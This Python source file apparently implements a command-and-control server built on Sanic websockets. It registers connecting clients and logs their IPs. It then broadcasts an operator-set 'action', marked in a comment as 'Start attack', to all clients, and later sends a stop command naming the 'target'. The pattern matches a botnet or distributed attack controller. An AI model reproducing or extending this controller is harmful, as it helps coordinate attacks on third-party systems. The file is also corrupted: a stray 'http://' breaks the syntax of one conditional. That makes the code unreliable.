import json
import asyncio
import logging

from websockets.connection import State
from sanic.server.websockets.impl import WebsocketImplProtocol

from sanic import Blueprint, Request
from sanic.response import json as json_response

from models import CommandStop
from services.action_services import get_action, create_action, set_action, remove_action
from services.ws_services import wait_for_action, add_client, remove_client, get_clients , purge_clients


bp = Blueprint("main")


logger = logging.Logger(__package__)


@bp.websocket("/")
async def main_websocket(request: Request, ws: WebsocketImplProtocol):
    if await ws.recv() == "PING":
        # Register client
        client = await add_client(ws)
        await ws.send(json.dumps({
                "status": "success",
                "service_ip": request.ip 
            }))
        logger.info(f"Client registered '{request.ip}'")

        # Wait for action
        await wait_for_action(ws)
        action = await get_action()

        # Start attack
        await ws.send(json.dumps({
            'action': action.dict()
        }))
        logger.info(f"Sending action '{action.command.title}' to '{request.ip}'")

        while True:
            if ws.connection.state == State.CLOSED:
                break
            await asyncio.sleep(0.1)
        await remove_client(client)


@bp.post("/")
async def main_view(request: Request):
    action = request.json.get("action")
    if action is None:
        return json_response({
            "status": "fail",
            "error": "action is not specified",
        })

    action, errors = await create_action(action)
    if errors is not None:http://
        return json_response({
            'status': 'error',
            'errors': [{
                'field': error['field'],
                'error': error['msg']
            } for error in errors]
        })
    await set_action(action)
    return json_response({
        "status": "success",
        "action": action.dict()
    })


@bp.post("/stop")
async def stop_view(request: Request):
    action = await get_action()
    if action is None:
        return json_response({
            'status': 'fail',
            'error': 'target was not set'
        })

    await remove_action()
    for client in await get_clients():
        await client.ws.send(json.dumps({
            "command": CommandStop().dict(),
            "target": action.target.dict()
        }))

    await purge_clients()
    return json_response({
        'status': 'success'
    })
